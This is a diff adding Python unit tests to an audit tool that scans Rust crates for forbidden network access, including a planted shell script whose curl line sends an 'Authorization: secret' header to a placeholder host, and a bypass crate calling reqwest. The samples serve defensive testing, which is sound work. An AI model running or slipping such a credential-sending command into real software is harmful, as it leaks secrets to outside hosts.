@@ -27,6 +27,31 @@ class V2CoreAuditTests(unittest.TestCase):
             self.assertNotEqual(result.returncode,0);self.assertIn("forbidden-adapter-path",result.stdout)
         finally: source.write_text(original)
 
+    def test_unknown_crate_and_non_rust_ambient_path_fail_closed(self):
+        attacks={ROOT/"crates/habitat-models/src/ambient.sh":"curl -H 'Authorization: secret' https://invalid\n",
+            ROOT/"crates/ambient-bypass/src/lib.rs":"pub fn bypass(){ let _ = reqwest::get(\"https://invalid\"); }\n"}
+        try:
+            for path,content in attacks.items(): path.parent.mkdir(parents=True,exist_ok=True);path.write_text(content)
+            with tempfile.TemporaryDirectory() as temporary:
+                result=self.run_audit(ROOT,Path(temporary)/"audit.json")
+            self.assertNotEqual(result.returncode,0)
+            self.assertTrue("forbidden-adapter-path" in result.stdout or "crates/ambient-bypass" in result.stdout)
+        finally:
+            for path in attacks:
+                if path.exists(): path.unlink()
+            for path in (ROOT/"crates/ambient-bypass/src",ROOT/"crates/ambient-bypass"):
+                if path.exists(): path.rmdir()
+
+    def test_inline_rust_test_is_inventoried(self):
+        source=ROOT/"crates/habitat-models/src/lib.rs";original=source.read_text()
+        try:
+            source.write_text(original+"\n#[test] fn hidden_inline_test(){ if true {} }\n")
+            with tempfile.TemporaryDirectory() as temporary:
+                output=Path(temporary)/"audit.json";result=self.run_audit(ROOT,output)
+                self.assertEqual(result.returncode,0,result.stdout);report=json.loads(output.read_text())
+                self.assertTrue(any(item["kind"]=="test" and "hidden_inline_test" in item["identity"] for item in report["records"]))
+        finally: source.write_text(original)
+
     def test_unmapped_fixture_fails_closed(self):
         fixture=ROOT/"tests/fixtures/unmapped/new.fixture";fixture.parent.mkdir(parents=True,exist_ok=True);fixture.write_text("opaque")
         try:
